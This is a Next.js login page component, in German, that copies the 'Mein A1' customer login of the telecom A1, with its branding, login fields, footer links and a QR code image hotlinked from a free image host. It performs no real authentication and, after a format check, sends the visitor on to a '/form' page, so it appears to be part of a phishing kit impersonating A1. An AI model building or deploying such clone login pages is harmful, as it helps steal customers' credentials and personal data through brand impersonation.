'use client'

import { useState } from 'react'
import { useRouter } from 'next/navigation'

export default function LoginPage() {
  const router = useRouter()
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [error, setError] = useState('')

  const validateEmail = (email: string) => {
    return email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setError('')

    if (!validateEmail(email)) {
      setError('Bitte geben Sie eine gültige E-Mail-Adresse ein')
      return
    }

    if (password.length < 6) {
      setError('Das Passwort muss mindestens 6 Zeichen lang sein')
      return
    }

    try {
      router.push('/form')
    } catch {
      setError('Anmeldung fehlgeschlagen')
    }
  }

  return (
    <div className="min-h-screen bg-[#f5f5f5]">
      {/* Header */}
      <header className="w-full bg-white border-b border-gray-200">
        <div className="max-w-[1200px] mx-auto px-6 py-4">
          <span className="text-[#e20074] text-2xl font-bold">A¹</span>
        </div>
      </header>

      {/* Main Content */}
      <div className="max-w-[1200px] mx-auto px-6 py-6 md:py-10">
        {/* Login Form */}
        <div className="w-full max-w-[460px] bg-white p-8 shadow-sm">
          <h1 className="text-[24px] font-bold mb-1">Herzlich willkommen</h1>
          <p className="text-[#666] text-[15px] mb-8">Bitte melden Sie sich an.</p>

          <div className="mb-8">
            <span className="text-[#e20074] font-bold border-b-[3px] border-[#e20074] pb-[6px] text-[14px]">
              MEIN A1 BENUTZERNAME
            </span>
          </div>

          <form onSubmit={handleSubmit} className="space-y-5">
            {error && (
              <div className="text-[#e20074] text-[14px] bg-[#fff3f8] p-3 rounded">
                {error}
              </div>
            )}

            <div>
              <input
                type="email"
                required
                placeholder="Benutzername oder E-Mail-Adresse"
                className="w-full p-3 border border-gray-300 text-[15px] focus:outline-none focus:border-[#e20074] placeholder-gray-500"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
            </div>

            <div>
              <input
                type="password"
                required
                placeholder="Passwort"
                className="w-full p-3 border border-gray-300 text-[15px] focus:outline-none focus:border-[#e20074] placeholder-gray-500"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
            </div>

            <div>
              <a href="#" className="text-[#e20074] text-[14px] hover:underline">
                Benutzerdaten vergessen?
              </a>
            </div>

            <button
              type="submit"
              className="w-full bg-[#757575] text-white py-[10px] text-[14px] font-medium hover:bg-[#666]"
            >
              ANMELDEN
            </button>

            <div className="text-center pt-2">
              <a href="#" className="text-[#e20074] text-[14px] hover:underline">
                Jetzt registrieren
              </a>
            </div>
          </form>
        </div>

        {/* App Info Section */}
        <div className="mt-8">
          <div className="bg-white p-8 shadow-sm max-w-[460px]">
            <h2 className="text-[18px] font-bold mb-6">Scan mich!</h2>
            <div className="flex gap-8">
              {/* QR Code */}
              <div className="w-[100px] h-[100px] flex-shrink-0">
                <img 
                  src="https://www2.pic-upload.de/thumb/37459160/scanqr.png"
                  alt="QR Code"
                  className="w-full h-full object-contain"
                />
              </div>
              <div>
                <p className="text-[14px] text-[#666] mb-4">
                  Laden Sie die Mein A1 App herunter und genießen Sie alle Vorteile.
                </p>
                <div className="flex flex-wrap gap-4">
                  <a href="#" className="text-[#e20074] text-[14px] hover:underline">App Store</a>
                  <a href="#" className="text-[#e20074] text-[14px] hover:underline">Google Play</a>
                  <a href="#" className="text-[#e20074] text-[14px] hover:underline">App Gallery</a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="w-full bg-white mt-auto border-t border-gray-200">
        <div className="max-w-[1200px] mx-auto px-6 py-4">
          <div className="flex flex-wrap gap-6 text-[13px]">
            <a href="#" className="text-[#666] hover:text-[#e20074]">Cookie-Einstellungen</a>
            <a href="#" className="text-[#666] hover:text-[#e20074]">AGB</a>
            <a href="#" className="text-[#666] hover:text-[#e20074]">Impressum</a>
            <a href="#" className="text-[#666] hover:text-[#e20074]">Datenschutz</a>
          </div>
        </div>
      </footer>
    </div>
  )
} 